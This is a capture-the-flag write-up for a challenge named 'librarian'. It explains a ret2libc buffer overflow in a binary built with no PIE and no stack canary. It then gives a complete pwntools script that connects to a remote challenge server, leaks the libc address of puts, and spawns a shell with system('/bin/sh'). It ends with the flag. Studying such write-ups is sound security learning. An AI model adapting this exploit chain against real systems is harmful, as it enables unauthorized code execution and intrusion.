# librarian

## Overview
A classic Ret2Libc buffer overflow challenge.

## Analysis
The challenge reads 0x100 bytes into a buffer at `rbp - 0x30` using `read`. This creates a buffer overflow. There's no PIE and no stack canary.
The binary is linked against `libc6_2.43-2ubuntu2.3_amd64`.

Because we need to call `main` twice, we have to carefully preserve the stack base pointer. The first payload sets `RBP` to a safe address in the `.bss` section (like `0x4040a0`) so that when the second `main` is called, it correctly uses this safe stack memory for reading inputs instead of unmapped or invalid stack regions.

## Solution
1. Exploit the overflow to jump to `puts_plt` with `puts_got` as the argument to leak the libc address of `puts`.
2. Find the correct libc version using `libc.rip` (it's `libc6_2.43-2ubuntu2.3_amd64`), and calculate the base address of `libc`.
3. Return to `main` (specifically `0x4011dc` to avoid alignment issues).
4. Send a second payload that jumps to `system("/bin/sh")`, ensuring the stack is 16-byte aligned by adding an extra `ret` gadget.

```python
from pwn import *
context.arch = 'amd64'

r = remote('136.115.87.65', 31782)
e = ELF('../files/main')
r.recvuntil(b"out?\n")

pop_rdi = 0x4011d6
ret = 0x40101a
puts_plt = e.plt['puts']
puts_got = e.got['puts']

# Stage 1: Leak libc
payload = b"A" * 0x30
payload += p64(0x4040a0) # safe BSS address for rbp
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(0x4011dc) # endbr64 before main

r.sendline(payload)
r.recvuntil(b"Invalid book\n")
leak = r.recv(6)
puts_addr = u64(leak.ljust(8, b'\x00'))
print("puts:", hex(puts_addr))

# Based on libc6_2.43-2ubuntu2.3_amd64
libc_base = puts_addr - 0x8eae0
system_addr = libc_base + 0x5c560
bin_sh = libc_base + 0x1db799

r.recvuntil(b"out?\n")

# Stage 2: system("/bin/sh")
payload2 = b"A" * 0x30
payload2 += p64(0x4040a0) # new rbp
payload2 += p64(ret) # stack align
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(system_addr)
r.sendline(payload2)

r.interactive()
```

**Flag:** `LITCTF{RET-2-LIBC-Is-sUp3R-4w2S0m3!!!}`
